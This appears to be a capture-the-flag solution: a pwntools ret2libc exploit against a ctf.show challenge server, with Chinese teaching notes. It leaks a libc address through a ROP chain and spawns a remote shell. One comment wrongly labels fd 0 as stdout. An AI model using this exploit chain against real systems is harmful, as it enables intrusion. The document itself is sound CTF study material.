from pwn import *
from LibcSearcher3 import *

context.log_level = 'debug'

p = remote('pwn.challenge.ctf.show', 28218)
elf = ELF('../code/pwn')
offset = 0x70 + 8

pop_rdi = 0x400803
pop_rsi_r15 = 0x400801

write_plt = elf.plt['write']
write_got = elf.got['write']

main_addr = elf.sym['main']

payload = b'a' * offset + p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(write_got) + p64(0) + p64(write_plt)

p.sendlineafter('O.o?\n', payload)

write_addr = u64(p.recvuntil(b'\x7f')[-6:] + b'\x00\x00')

libc = LibcSearcher('write', write_addr)

libcbase = write_addr - libc.dump('write')

sys_addr = libcbase + libc.dump('system')
bin_sh_addr = libcbase + libc.dump('str_bin_sh')

payload2 = b'a' * offset + p64(pop_rdi) + p64(bin_sh_addr) + p64(sys_addr)

p.sendline(payload2)

p.interactive()

"""
【知识点讲解】
1. 题目类型：ret2libc - 64位动态链接程序
2. 64位ROP链 + 地址泄露：
   - 需要pop_rdi和pop_rsi_r15两个gadget
3. Gadget分析：
   - pop_rdi (0x400803): pop rdi; ret
   - pop_rsi_r15 (0x400801): pop rsi; pop r15; ret
   - 这两个gadget通常成对出现，用于给write传参
4. payload结构（第一次）：
   b'a' * offset         - 填充
   + p64(pop_rdi)        - 弹出0到rdi（fd参数）
   + p64(0)              - stdout
   + p64(pop_rsi_r15)    - 弹出write_got到rsi
   + p64(write_got)      - 要打印的地址
   + p64(0)              - r15（无用，填充）
   + p64(write_plt)      - 调用write
5. 地址解析：
   u64(p.recvuntil(b'\x7f')[-6:] + b'\x00\x00')
   - 64位地址以\x7f开头
   - 接收6字节，补两个\x00，解包为64位整数
6. payload结构（第二次）：
   填充 + pop_rdi + bin_sh + system
7. 关键点：64位ROP链的构造和地址解析
"""
